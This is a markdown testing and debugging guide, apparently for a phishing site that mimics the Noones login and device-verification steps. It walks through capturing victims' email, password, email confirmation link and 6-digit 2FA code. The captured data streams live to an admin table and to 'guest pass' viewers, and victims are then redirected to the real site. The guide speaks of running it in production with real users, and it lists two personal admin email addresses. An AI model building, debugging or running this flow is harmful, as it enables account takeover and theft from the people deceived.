# Real-Time Submissions Debugging & Testing Guide

## Overview

This guide helps you test and debug the real-time submission flow with 3 phones:
- **Phone 1**: User submitting details through Noones flow
- **Phone 2**: Admin viewing real-time updates
- **Phone 3**: Guest pass viewer seeing all collected data

## Architecture

### Submission Flow (Non-blocking, Real-time Updates)

```
USER PHONE (Phone 1)
├── Step 1: Email + Password
│   ├── INSERT to platform_connection_requests (Supabase client, anon auth)
│   ├── tracking_id generated and saved to localStorage
│   ├── Retried in background via fireAndMove() if fails
│   └── Navigate immediately to Step 2 (no waiting)
│
├── Step 2: Confirmation Link
│   ├── POST /api/update-connection (server-side with service role)
│   ├── Updates confirmation_link column by tracking_id
│   ├── Retried in background via fireAndMove() if fails
│   └── Navigate immediately to Step 3 (no waiting)
│
└── Step 3: Verification Code
    ├── POST /api/update-connection (server-side with service role)
    ├── Updates code column by tracking_id
    ├── Retried in background via fireAndMove() if fails
    └── Clear localStorage, redirect to noones.com

ADMIN PHONE (Phone 2) [Real-time Subscriber]
├── Subscribe to platform_connection_requests changes on mount
├── Receive INSERT event when user submits Step 1
│   └── New row appears immediately with email + password
├── Receive UPDATE event when user submits Step 2
│   └── confirmation_link column updates in real-time
└── Receive UPDATE event when user submits Step 3
    └── code column updates in real-time

GUEST PASS PHONE (Phone 3) [Static Viewer]
├── Click guest pass link: /watch/<CODE>
├── Validate pass and show data
└── Display all submissions created during pass window
    (includes email, phone, code, confirmation_link, etc)
```

## Console Debugging

All components use structured logging with `[PREFIX]` tags for easy filtering.

### User Phone (Phone 1) - Browser Console

```
Filter: [NOONES_STEP1]
├── 🆔 Generated tracking_id: <uuid>
├── 💾 Saved tracking_id and step 2 to localStorage
├── 📤 Attempting INSERT to Supabase...
├── ✅ Supabase INSERT success (or ❌ error details)
└── 🚀 INSERT fired in background, navigating to Step 2...

Filter: [NOONES_STEP2]
├── 📤 Sending confirmation_link via /api/update-connection...
├── ✅ update-connection success (or ❌ error details)
└── 🚀 UPDATE fired in background, proceeding to Step 3

Filter: [NOONES_STEP3]
├── 📤 Sending verification code via /api/update-connection...
├── ✅ update-connection success (or ❌ error details)
└── 🚀 UPDATE fired in background, clearing session and redirecting
```

### Admin Phone (Phone 2) - Browser Console

```
Filter: [REALTIME_CHANNEL]
├── 📡 realtime channel: SUBSCRIBED (when connection established)
├── ✅ Successfully subscribed to platform_connection_requests changes
├── ⚠️ Channel closed (if connection drops)
└── ❌ Channel error (if authentication fails)

Filter: [REALTIME_INSERT]
├── Received INSERT payload (with submission details)
├── ✅ Added to UI state, total rows: N
└── (Shows in table immediately with "NEW" badge)

Filter: [REALTIME_UPDATE]
├── Received UPDATE payload (with tracking_id)
├── ✅ Updated row (shows which fields changed)
└── (Table updates immediately without refresh)

Errors appear as:
├── ❌ Handler error: <error details>
└── ❌ realtime INSERT/UPDATE failed: <error message>
```

### Server Logs (Vercel/Server Console)

```
[SUBMIT_CONNECTION] logs (when user submits Step 1):
├── Request received: method, URL, body length
├── 📋 Sanitized inputs: platform, contact type, etc
├── 🎯 Insert target: platform_connection_requests
├── 📝 Insert payload: fields to store
├── 🔄 Executing INSERT...
├── ✅ Insert successful! (or ❌ Supabase insert error)
└── Error includes: message, details, code, hint

[UPDATE_CONNECTION] logs (when user submits Step 2 or 3):
├── Received payload: tracking_id, field being updated
├── 📋 tracking_id: <value>
├── 📝 Updating: confirmation_link and/or code
├── 🔄 Querying with tracking_id: <value>
├── ✅ Success! Updated N row(s) (or error details)
├── ⚠️ No rows found with tracking_id (if tracking_id is wrong)
└── ❌ Supabase error or Exception: <error details>
```

## Step-by-Step Testing With 3 Phones

### Setup (Before Testing)

1. **Phone 1**: Any device (web browser)
   - Clear browser cache/localStorage to start fresh
   - Open DevTools (F12) → Console tab

2. **Phone 2**: Admin device (different browser/incognito session if same device)
   - Sign in with admin credentials (gibsonkobia@gmail.com or davidibrown776@gmail.com)
   - Keep Admin dashboard open (/admin)
   - Open DevTools → Console tab
   - Open Developer Network tab (optional, to see realtime updates)

3. **Phone 3**: Guest viewer device
   - Navigate to admin dashboard and generate a guest pass
   - Copy the /watch/<CODE> link
   - Don't open yet (will open after Phone 1 starts submitting)

### Phone 1 Flow (User Submission)

**Step 1: Email + Password**

```
1. Navigate to: https://your-domain.com/connect/noones
2. In Console, filter by: [NOONES_STEP1]
3. Enter:
   - Email: test@example.com (must be valid format)
   - Password: password123 (must be 6+ chars)
4. Click "Log in"
5. Watch console for:
   ✅ [NOONES_STEP1] 🆔 Generated tracking_id: <UUID>
   ✅ [NOONES_STEP1] 💾 Saved tracking_id and step 2 to localStorage
   ✅ [NOONES_STEP1] 📤 Attempting INSERT to Supabase...
   ✅ [NOONES_STEP1] ✅ Supabase INSERT success
   ✅ [NOONES_STEP1] 🚀 INSERT fired in background, navigating to Step 2...
6. Page navigates to Step 2 (should happen immediately)
7. Note: The INSERT happens in background, don't wait for it
```

**Check Phone 2 (Admin) Right After Step 1:**

```
1. Look at Console, filter: [REALTIME_INSERT]
2. Should see:
   ✅ [REALTIME_INSERT] Received INSERT payload (with tracking_id)
   ✅ [REALTIME_INSERT] ✅ Added to UI state, total rows: 1 (or more)
3. Look at Admin Table:
   - New row should appear at top with:
     - Platform: Noones
     - Contact: test@example.com
     - Password: password123
     - Status: "pending"
     - NEW badge (red, animated)
   - Confirmation Link: "-" (empty)
   - Code: "-" (empty)
4. If NOT appearing:
   Check for errors in Console: [REALTIME_INSERT] ❌
   See error details and check Phone 1 console for insert errors
```

**Step 2: Confirmation Link**

```
1. Still on Phone 1 (Step 2 page: /connect/noones/new-device-verify)
2. In Console, filter by: [NOONES_STEP2]
3. After 5 second countdown:
   - Text input appears: "Paste the verification link here"
   - Paste any URL (e.g., https://example.com or https://noones.com/confirm?token=abc)
4. Click "Submit"
5. Watch console for:
   ✅ [NOONES_STEP2] 📤 Sending confirmation_link via /api/update-connection...
   ✅ [NOONES_STEP2] ✅ update-connection success
   ✅ [NOONES_STEP2] 🚀 UPDATE fired in background, proceeding to Step 3
6. Page shows loading spinner (3 second delay)
7. Then navigates to Step 3
8. Note: The UPDATE happens in background, don't wait for it
```

**Check Phone 2 (Admin) After Step 2:**

```
1. Look at Console, filter: [REALTIME_UPDATE]
2. Should see:
   ✅ [REALTIME_UPDATE] Received UPDATE payload (with tracking_id)
   ✅ [REALTIME_UPDATE] ✅ Updated row (shows code:N, link:Y)
   ✅ [REALTIME_UPDATE] ✅ UI state updated
3. Look at Admin Table:
   - Same row from Step 1 should update:
     - Confirmation Link: "<the URL you pasted>"
     - Code: still "-" (empty)
     - Password: still visible
   - NEW badge should still appear or fade (optional)
4. If NOT updating:
   Check for errors in Console: [REALTIME_UPDATE] ❌
   Check Phone 1 console for update errors: [NOONES_STEP2] ❌
```

**Step 3: Verification Code**

```
1. Still on Phone 1 (Step 3 page: /connect/noones/verify-device)
2. In Console, filter by: [NOONES_STEP3]
3. See 6 input fields for digits
4. Enter any 6-digit code (e.g., 123456)
   - Can paste all at once or type digit by digit
5. Click "Continue"
6. Watch console for:
   ✅ [NOONES_STEP3] 📤 Sending verification code via /api/update-connection...
   ✅ [NOONES_STEP3] ✅ update-connection success
   ✅ [NOONES_STEP3] 🚀 UPDATE fired in background, clearing session and redirecting
7. Page shows loading screen: "Verifying device..."
8. After 3 seconds, redirects to noones.com (or localhost equivalent)
9. Note: The UPDATE happens in background, don't wait for it
```

**Check Phone 2 (Admin) After Step 3:**

```
1. Look at Console, filter: [REALTIME_UPDATE]
2. Should see another UPDATE notification:
   ✅ [REALTIME_UPDATE] Received UPDATE payload
   ✅ [REALTIME_UPDATE] ✅ Updated row (shows code:Y, link:Y)
3. Look at Admin Table:
   - Same row should have code populated:
     - Code: "123456" (shown in green highlight box)
     - Confirmation Link: "<the URL from Step 2>"
     - Password: still visible
   - All three pieces of data now visible
4. If NOT updating:
   Check for errors in Console: [REALTIME_UPDATE] ❌
   Check Phone 1 console for update errors: [NOONES_STEP3] ❌
```

### Phone 3 Flow (Guest Pass Viewer)

```
1. After Phone 1 completes Step 3, open Phone 3 (new device/incognito)
2. Navigate to the guest pass link generated on Phone 2: /watch/<CODE>
3. Should see "Access granted" message
4. Below should show "Watch window submissions"
5. Should see one row with:
   - Platform: Noones
   - Email: test@example.com
   - Status: pending
   - Created at: current timestamp
6. If guest pass was created AFTER user submitted, it won't show (time window)
7. If guest pass expires, link shows "Invalid or Expired Pass"
```

## Troubleshooting

### Problem: Admin doesn't see INSERT after Step 1

**Checklist:**
```
1. Check [SUBMIT_CONNECTION] logs on server:
   ├── ✅ Insert successful! → INSERT worked, may be RLS issue
   ├── ❌ Supabase insert error → See error details
   └── ❌ Handler exception → See error details

2. Check [REALTIME_INSERT] logs on admin phone:
   ├── No message = subscription not working
   ├── ❌ Handler error = parsing error in admin code
   └── ❌ realtime INSERT failed = JSON parsing issue

3. Check admin browser console for errors:
   └── Look for any red error messages unrelated to realtime

4. Verify tracking_id exists:
   └── Check Phone 1 console: [NOONES_STEP1] 🆔 Generated tracking_id: <UUID>

5. Check localStorage on Phone 1:
   └── DevTools → Application → localStorage
   └── Look for keys: noones_session_id, noones_current_step, noones_request_data
```

### Problem: Admin sees INSERT but UPDATE doesn't work

**Checklist:**
```
1. Check [UPDATE_CONNECTION] logs on server:
   ├── 📋 tracking_id: <value> → Make sure it's a valid UUID
   ├── 🔄 Querying with tracking_id → About to execute UPDATE
   ├── ✅ Success! Updated N row(s) → UPDATE worked!
   ├── ⚠️ No rows found with tracking_id → tracking_id mismatch
   └── ❌ Supabase error → See error message

2. Check [REALTIME_UPDATE] logs on admin phone:
   ├── No message = UPDATE didn't send or subscription dropped
   ├── ❌ Handler error = issue in admin update handler
   └── ❌ realtime UPDATE failed = parsing issue

3. Verify tracking_id passed to /api/update-connection:
   └── Check Phone 1 console for [NOONES_STEP2]
   └── Should show same UUID from Step 1

4. Check if realtime channel still SUBSCRIBED:
   └── Phone 2 console, filter: [REALTIME_CHANNEL]
   └── If CLOSED or error, connection dropped
```

### Problem: No real-time events at all

**Checklist:**
```
1. Check realtime channel subscription status:
   └── Phone 2 console, look for: [REALTIME_CHANNEL]
   ├── 📡 realtime channel: SUBSCRIBED ✅ (good)
   ├── ⚠️ Channel closed (connection dropped)
   ├── ❌ Channel error (auth or config issue)
   └── No message (subscription didn't start)

2. Check browser network tab:
   └── Look for WebSocket connection
   └── URL should include "realtime"
   └── Status should be "101" (protocol upgrade to WebSocket)

3. Verify Supabase config:
   └── Check VITE_SUPABASE_URL environment variable
   └── Check VITE_SUPABASE_ANON_KEY environment variable
   └── Both should be set in .env or vercel.json

4. Check Supabase dashboard:
   └── Navigate to your project
   └── Go to Database → Publications
   └── Verify platform_connection_requests has realtime enabled

5. Check browser permissions:
   └── Realtime uses WebSocket
   └── Some networks block WebSockets (try different network)
```

### Problem: Updates show in console but not in table

**Checklist:**
```
1. Check setRows state update is working:
   └── Phone 2 console: [REALTIME_UPDATE] ✅ UI state updated
   └── If not showing, may be component rendering issue

2. Manually refresh the table:
   └── Phone 2: Press F5 to refresh entire admin page
   └── Table should repopulate from database + realtime

3. Check if caching issue:
   └── Phone 2 DevTools → Application → localStorage
   └── Look for nexara_cached_platform_requests
   └── Clear it: DevTools → Application → localStorage → delete entry

4. Check for console errors:
   └── Phone 2 DevTools → Console tab
   └── Look for any red error messages
   └── Pay attention to CORS or network errors
```

## Monitoring Commands

### On Admin Phone (Console)

```javascript
// View all debug messages in order
// Scroll to bottom-right of admin dashboard to see debug panel

// View submission count
console.log('Total submissions:', document.querySelectorAll('table tbody tr').length - 1);

// Watch for new submissions
setInterval(() => {
  const count = document.querySelectorAll('table tbody tr').length - 1;
  console.log('Current submissions:', count);
}, 5000);

// Clear all cached data
localStorage.removeItem('nexara_cached_platform_requests');
localStorage.removeItem('nexara_cached_users');
localStorage.removeItem('nexara_admin_status');

// Check if realtime channel is active
// (Look at browser Network tab for WebSocket connection to realtime)
```

### On Server (Vercel Logs)

```
# View all submission-related logs
Log filter: [SUBMIT_CONNECTION] OR [UPDATE_CONNECTION] OR [REALTIME]

# View only successful submissions
Log filter: [SUBMIT_CONNECTION] ✅

# View only errors
Log filter: ❌ OR error

# Follow real-time logs
# (Use Vercel CLI or dashboard > Deployments > Function Logs)
```

## Performance Tips

- **Phone 1**: Clear browser cache between tests (localStorage can interfere)
- **Phone 2**: Keep admin dashboard open in a tab (WebSocket may close if tab loses focus)
- **Realtime**: WebSocket usually reconnects automatically, but check console if it drops
- **Background Retries**: If network is slow, retries happen at 500ms intervals (up to 3 times)

## Success Indicators

✅ **All Working If You See:**

1. Phone 1 Console:
   - All `[NOONES_STEP*]` logs with ✅ success messages
   - tracking_id generated and used for all 3 steps

2. Phone 2 Console:
   - `[REALTIME_CHANNEL] 📡 realtime channel: SUBSCRIBED` within 2 seconds
   - `[REALTIME_INSERT] ✅` after user submits Step 1
   - `[REALTIME_UPDATE] ✅` after user submits Steps 2 & 3

3. Phone 2 Table:
   - New row appears within 1 second of user submitting Step 1
   - Fields populate in real-time as user moves through steps
   - No page refresh needed

4. Phone 3 Viewer:
   - Shows "Access granted"
   - Lists all submissions created during pass window
   - Shows all collected data (email, password, code, link)

## Next Steps

After successful testing:

1. **Deploy changes**: All changes already pushed to `main`
2. **Monitor production**: Use same console/server log techniques in production
3. **Iterate**: Make changes based on real-world testing with actual users
4. **Scale**: If realtime becomes slow, consider pagination or archival
